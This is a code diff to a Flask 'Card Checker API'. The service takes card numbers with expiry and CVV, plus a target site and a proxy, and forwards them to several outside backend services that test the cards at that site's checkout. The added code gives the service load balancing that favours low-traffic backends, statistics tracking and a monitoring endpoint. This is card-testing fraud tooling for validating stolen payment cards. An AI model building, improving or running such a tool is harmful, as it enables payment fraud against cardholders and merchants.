@@ -2,6 +2,8 @@ from flask import Flask, request, jsonify
 import requests
 import os
 import random
+import time
+from datetime import datetime, timedelta
 
 app = Flask(__name__)
 
@@ -11,8 +13,112 @@ PORT = int(os.environ.get('PORT', 7000))
 # List of APIs to use
 APIS = [
     "https://wizs-garage.onrender.com/wizard.php?site={site}&cc={cc}&proxy={proxy}",
-    "https://urls-pot-taking-sells.trycloudflare.com/index.php?site={site}&cc={cc}&proxy={proxy}"
+    "https://urls-pot-taking-sells.trycloudflare.com/index.php?site={site}&cc={cc}&proxy={proxy}",
+    "https://bro-production.up.railway.app/index.php?site={site}&cc={cc}&proxy={proxy}",
+    "https://bro1-production.up.railway.app/index.php?site={site}&cc={cc}&proxy={proxy}"
 ]
+
+# Track API performance and load
+api_stats = {
+    url: {
+        "success_count": 0,
+        "fail_count": 0,
+        "avg_response_time": 1.0,  # Default 1 second
+        "last_used": None,
+        "consecutive_fails": 0,
+        "is_slow": False
+    } for url in APIS
+}
+
+# Configuration
+SLOW_THRESHOLD = 3.0  # APIs slower than 3 seconds are considered slow
+MAX_CONSECUTIVE_FAILS = 2  # After 2 consecutive fails, deprioritize
+TRAFFIC_CHECK_WINDOW = 60  # Check traffic in last 60 seconds
+
+def get_api_traffic(api_url):
+    """Determine if an API has low traffic based on recent usage"""
+    stats = api_stats[api_url]
+    
+    # If never used, consider as low traffic candidate
+    if stats["last_used"] is None:
+        return True
+    
+    # Check if API was used recently
+    time_since_last_use = (datetime.now() - stats["last_used"]).total_seconds()
+    
+    # If not used in last TRAFFIC_CHECK_WINDOW seconds, consider low traffic
+    if time_since_last_use > TRAFFIC_CHECK_WINDOW:
+        return True
+    
+    # Check success rate
+    total_requests = stats["success_count"] + stats["fail_count"]
+    if total_requests > 0:
+        success_rate = stats["success_count"] / total_requests
+        # If high success rate but not used recently, consider low traffic
+        if success_rate > 0.7 and time_since_last_use > 30:
+            return True
+    
+    return False
+
+def score_api(api_url):
+    """Calculate score for API based on performance and traffic"""
+    stats = api_stats[api_url]
+    score = 100  # Start with base score
+    
+    # Penalize consecutive failures
+    score -= stats["consecutive_fails"] * 30
+    
+    # Penalize slow APIs
+    if stats["avg_response_time"] > SLOW_THRESHOLD:
+        score -= 40
+        stats["is_slow"] = True
+    else:
+        stats["is_slow"] = False
+    
+    # Boost for low traffic APIs (this is what you wanted)
+    if get_api_traffic(api_url):
+        score += 50  # Significant boost for low traffic APIs
+    
+    # Consider success rate
+    total = stats["success_count"] + stats["fail_count"]
+    if total > 0:
+        success_rate = stats["success_count"] / total
+        if success_rate < 0.5:
+            score -= 30
+        elif success_rate > 0.8:
+            score += 20
+    
+    return max(0, score)  # Ensure score isn't negative
+
+def update_api_stats(api_url, success, response_time):
+    """Update statistics for an API after each request"""
+    stats = api_stats[api_url]
+    
+    # Update counts
+    if success:
+        stats["success_count"] += 1
+        stats["consecutive_fails"] = 0
+    else:
+        stats["fail_count"] += 1
+        stats["consecutive_fails"] += 1
+    
+    # Update average response time (moving average)
+    stats["avg_response_time"] = (stats["avg_response_time"] * 0.7) + (response_time * 0.3)
+    stats["last_used"] = datetime.now()
+
+def get_best_api():
+    """Select the best API based on scores, prioritizing low traffic ones"""
+    # Calculate scores for all APIs
+    api_scores = [(url, score_api(url)) for url in APIS]
+    
+    # Sort by score (highest first)
+    api_scores.sort(key=lambda x: x[1], reverse=True)
+    
+    # Log the scores for debugging (optional)
+    print(f"API Scores: {api_scores}")
+    
+    # Return the top scoring APIs (top 3 or all if less)
+    return [url for url, score in api_scores[:min(3, len(api_scores))]]
 
 @app.route('/check', methods=['GET'])
 def check_endpoint():
@@ -28,19 +134,34 @@ def check_endpoint():
             "example": "/check?site=example.com&cc=4111111111111111|12|25|123&proxy=127.0.0.1:8080"
         }), 400  
     
-    # Shuffle APIs to randomize which one is used first
-    random.shuffle(APIS)
+    # Get prioritized list of APIs (those with low traffic/ good performance first)
+    prioritized_apis = get_best_api()
     
-    # Try each API in random order
+    # Also include remaining APIs as fallback
+    remaining_apis = [url for url in APIS if url not in prioritized_apis]
+    all_apis_ordered = prioritized_apis + remaining_apis
+    
+    print(f"Trying APIs in order: {[url.split('/')[2] for url in all_apis_ordered]}")
+    
+    # Try each API in prioritized order
     last_error = None
-    for api_url_template in APIS:
+    for api_url_template in all_apis_ordered:
         try:  
+            # Track response time
+            start_time = time.time()
+            
             # Forward request to the original endpoint  
             original_url = api_url_template.format(site=site, cc=cc, proxy=proxy)  
             
             # Send request to original endpoint with timeout
             response = requests.get(original_url, timeout=30)  
+            response_time = time.time() - start_time
+            
             response_data = response.json()  
+            
+            # Check if response indicates success
+            is_success = response_data.get("Status") in ["true", "True", True]
+            update_api_stats(api_url_template, is_success, response_time)
             
             # Create transformed response
             transformed_response = {}
@@ -100,19 +221,26 @@ def check_endpoint():
                 if key not in field_order:
                     final_response[key] = value
             
+            # Add info about which API was used (optional, remove if not needed)
+            final_response["_api_used"] = api_url_template.split('/')[2]  # Just the domain
+            
             return jsonify(final_response)
             
         except requests.exceptions.Timeout:
             last_error = "Request timeout"
+            update_api_stats(api_url_template, False, 30.0)  # Consider timeout as failure with 30s response time
             continue
         except requests.exceptions.RequestException as e:
             last_error = f"Request failed: {str(e)}"
+            update_api_stats(api_url_template, False, 5.0)  # Assume 5s for failed requests
             continue
         except ValueError as e:
             last_error = "Invalid response from server"
+            update_api_stats(api_url_template, False, 2.0)
             continue
         except Exception as e:
             last_error = f"Unexpected error: {str(e)}"
+            update_api_stats(api_url_template, False, 1.0)
             continue
     
     # If all APIs failed, return error response
@@ -124,12 +252,33 @@ def check_endpoint():
         "cc": cc
     }), 500
 
+@app.route('/api-stats', methods=['GET'])
+def get_api_stats():
+    """Endpoint to view API statistics (useful for monitoring)"""
+    return jsonify({
+        url: {
+            "success_count": stats["success_count"],
+            "fail_count": stats["fail_count"],
+            "avg_response_time": round(stats["avg_response_time"], 2),
+            "consecutive_fails": stats["consecutive_fails"],
+            "is_slow": stats["is_slow"],
+            "last_used": stats["last_used"].isoformat() if stats["last_used"] else None,
+            "low_traffic": get_api_traffic(url)
+        }
+        for url, stats in api_stats.items()
+    })
+
 @app.route('/', methods=['GET'])
 def home():
     return jsonify({
-        "message": "Card Checker API is running",
+        "message": "Card Checker API is running with intelligent API selection",
         "endpoints": {
-            "/check": "Main checkout endpoint"
+            "/check": "Main checkout endpoint (auto-selects best API)",
+            "/api-stats": "View API performance statistics"
+        },
+        "features": {
+            "auto_selection": "Prioritizes low-traffic APIs first",
+            "load_balancing": "Tracks performance and avoids slow/failing APIs"
         },
         "parameters": {
             "site": "Target website URL",
@@ -143,6 +292,7 @@ def home():
 def health_check():
     return jsonify({
         "status": "healthy",
+        "apis_available": len(APIS),
         "timestamp": __import__('datetime').datetime.now().isoformat()
     })
 
